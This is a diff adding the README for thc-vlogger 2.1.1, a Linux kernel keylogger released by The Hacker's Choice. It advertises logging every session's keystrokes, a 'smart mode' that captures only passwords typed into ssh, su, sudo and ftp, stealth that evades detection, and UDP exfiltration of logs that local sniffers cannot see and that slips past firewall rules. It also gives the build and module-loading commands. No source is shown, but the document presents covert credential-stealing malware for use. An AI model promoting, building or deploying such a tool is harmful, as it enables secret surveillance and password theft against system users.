@@ -1,0 +1,97 @@
+			*******************************
+			***** THC PUBLIC RELEASE *****
+			*******************************
+
+				thc-vlogger 2.1.1
+			Advanced Linux Kernel Keylogger
+
+|=------------------------=[ (C) by rd <rd@thc.org> ]=-----------------------=|
+|=--------------------------=[ The Hacker's Choice ]=-------------------------|
+		 		http://www.thc.org
+
+
+
+FEATURE
+
+o Log keystrokes of all user sessions
+
+	Console, serial console 
+	Telnet/SSH remote sessions
+
+
+o Stealth mechanism
+
+	No syscall modifying, nearly impossible to detect
+	UDP packets of log data can not be seen from the box itself
+
+
+o Multiple logging modes and methods
+
+	Support three logging modes
+		Switch between logging modes by specific keys sequence
+		Default toggle character is CTRL-]
+
+	Dumb mode
+		Logs all keystrokes
+
+	Smart mode
+		Ability to detect password prompt automatically to log only 
+		sensitive data such as user/password (ssh, telnet, su, sudo, 
+		ftp, ...)
+
+	Normal mode 
+		Stop logging mode
+
+
+o Log methods
+
+	Log to files
+	
+	Remote log over network
+		Transmits log data via UDP to a specified machine
+
+	System users neither see nor sniff log packets
+		Sniffers such as tcpdump on the box can not see the traffic
+		Bypass local network filtering/firewall rules
+
+
+o Log data
+
+	Separated logging for each tty/session
+		Each tty has their own log buffer
+		Easier to track sessions
+
+	Timestamps logging
+
+	Nearly support all special chars
+		Arrow keys (left, right, up, down), Home, Page Up, Page Down
+		F1 to F12, Shift+F1 to Shift+F12
+		ALT- and CTRL- combinations 
+		Tab, Insert, Delete, End, Backspace, ...
+
+	Support line editing keys included CTRL-U and Backspace
+
+
+
+CONFIGURING and COMPILING
+
+  $ ./configure
+  $ make
+
+  Run vlogconfig or edit vlogctrl manually to set approriated parameters for 
+  vlogger module
+  $ ./vlogconfig
+
+  Use vlogctrl to load/unload vlogger
+  # ./vlogctrl load
+ 
+
+
+DOCUMENTATION
+	See doc/vlogger.txt (old doc but still usefull)
+
+
+
+GREETS
+	thc, teso, segfault.net, monkey.org, phenoelit, hert, 
+	vnsecurity and many other friends.
